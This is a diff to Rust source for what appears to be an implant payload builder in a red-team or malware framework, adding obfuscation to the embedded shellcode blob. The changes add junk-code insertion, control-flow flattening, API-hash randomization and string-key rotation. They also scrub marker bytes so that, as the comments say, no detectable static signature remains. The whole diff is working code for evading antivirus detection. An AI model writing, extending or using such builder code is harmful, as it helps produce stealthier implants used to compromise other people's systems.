@@ -12,8 +12,8 @@ pub use formats::{
     format_service_exe, list_formats, FormatInfo,
 };
 pub use obfuscation::{
-    obfuscate, obfuscate_blob, ObfuscationError, ObfuscationResult, ObfuscationSettings,
-    RandomizedMagics,
+    apply_transforms, finalize_payload, obfuscate, obfuscate_blob, ObfuscationError,
+    ObfuscationResult, ObfuscationSettings, RandomizedMagics,
 };
 pub use yara::{scan_payload, YaraError, YaraMatch};
 
@@ -219,6 +219,7 @@ impl PayloadBuilder {
             EvasionFlags::default(),
             false,
             false,
+            &ObfuscationSettings::default(),
         )
     }
 
@@ -233,6 +234,7 @@ impl PayloadBuilder {
         evasion: EvasionFlags,
         debug_mode: bool,
         skip_anti_analysis: bool,
+        obfuscation_settings: &ObfuscationSettings,
     ) -> Result<BuildResult, BuilderError> {
         // Get the PIC blob for key derivation (implant derives key from SHA256 of first 64 bytes)
         let pic_blob = self
@@ -269,29 +271,39 @@ impl PayloadBuilder {
 
         let build_id = uuid::Uuid::new_v4().to_string();
 
+        // Phase A: Apply obfuscation transforms to the PIC blob BEFORE embedding.
+        // This rotates string keys, randomizes API hashes, inserts junk code,
+        // and applies CFF on the raw PIC blob where the SPEC* markers are.
+        let obfuscated_pic: Option<Vec<u8>> = if let Some(pic_template) =
+            self.templates.get(&OutputFormat::RawShellcode)
+        {
+            let mut pic_data = pic_template.data.clone();
+            obfuscation::apply_transforms(&mut pic_data, obfuscation_settings)
+                .map_err(|e| BuilderError::Config(format!("Obfuscation transform failed: {e}")))?;
+            Some(pic_data)
+        } else {
+            None
+        };
+
         // For raw shellcode, concatenate PIC blob + config.
         // For PE formats, try pre-compiled template first, fall back to
         // generated minimal PE stubs if no template is available.
         let payload = if format == OutputFormat::RawShellcode {
-            self.format_raw(&gen)?
+            self.format_raw_with_pic(&gen, obfuscated_pic.as_deref())?
         } else if let Some(template) = self.templates.get(&format) {
             // Pre-compiled PE stub: patch config, then embed PIC blob
             let mut patched = self.embed_config(template, &gen)?;
 
-            // Embed the PIC blob into the stub at the SPECPICBLOB marker
-            if let Some(pic_template) = self.templates.get(&OutputFormat::RawShellcode) {
-                patched = Self::embed_pic_blob(patched, &pic_template.data, self.pic_entry_offset)?;
+            // Embed the (obfuscated) PIC blob into the stub at the SPECPICBLOB marker
+            if let Some(ref pic_data) = obfuscated_pic {
+                patched = Self::embed_pic_blob(patched, pic_data, self.pic_entry_offset)?;
             }
 
             patched
         } else {
             // No pre-compiled template — use generated PE stubs.
-            // Get the raw PIC blob (if available) for embedding.
-            let pic_blob = self
-                .templates
-                .get(&OutputFormat::RawShellcode)
-                .map(|t| t.data.as_slice())
-                .unwrap_or(&[]);
+            // Use the obfuscated PIC blob if available, otherwise empty.
+            let pic_blob = obfuscated_pic.as_deref().unwrap_or(&[]);
             match format {
                 OutputFormat::DllSideload => {
                     formats::format_dll(pic_blob, &gen.config_blob, None)
@@ -323,10 +335,15 @@ impl PayloadBuilder {
 
         // Patch build flags (debug mode, skip anti-analysis) into the PIC blob
         // via the SPBF marker. This must happen AFTER payload assembly so the
-        // marker is present in the final binary.
-        if debug_mode || skip_anti_analysis {
-            obfuscation::patch_build_flags(&mut payload, debug_mode, skip_anti_analysis);
-        }
+        // marker is present in the final binary. Always called (even when both
+        // flags are false) to ensure the SPBF marker is scrubbed from the final
+        // payload — otherwise it remains as a detectable static signature.
+        obfuscation::patch_build_flags(&mut payload, debug_mode, skip_anti_analysis);
+
+        // Phase B: Scrub all remaining SPEC* markers from the final payload.
+        // This must happen AFTER config magic patching (SPECCFGM) and build
+        // flags patching (SPBF) are complete, but BEFORE XOR encryption.
+        obfuscation::finalize_payload(&mut payload);
 
         Ok(BuildResult {
             payload,
@@ -336,15 +353,19 @@ impl PayloadBuilder {
         })
     }
 
-    /// Format raw shellcode: PIC template blob + config blob appended.
+    /// Format raw shellcode using the provided (potentially obfuscated) PIC blob.
     ///
     /// Layout: [PIC blob][config_len: u32 LE][config_blob]
-    fn format_raw(&self, gen: &GeneratedConfig) -> Result<Vec<u8>, BuilderError> {
+    fn format_raw_with_pic(
+        &self,
+        gen: &GeneratedConfig,
+        pic_data: Option<&[u8]>,
+    ) -> Result<Vec<u8>, BuilderError> {
         let mut payload = Vec::new();
 
-        // If we have a raw template (specter.bin), prepend it
-        if let Some(template) = self.templates.get(&OutputFormat::RawShellcode) {
-            payload.extend_from_slice(&template.data);
+        // Prepend PIC blob if available
+        if let Some(pic) = pic_data {
+            payload.extend_from_slice(pic);
         }
 
         // Append config: [length: u32 LE][encrypted config blob]
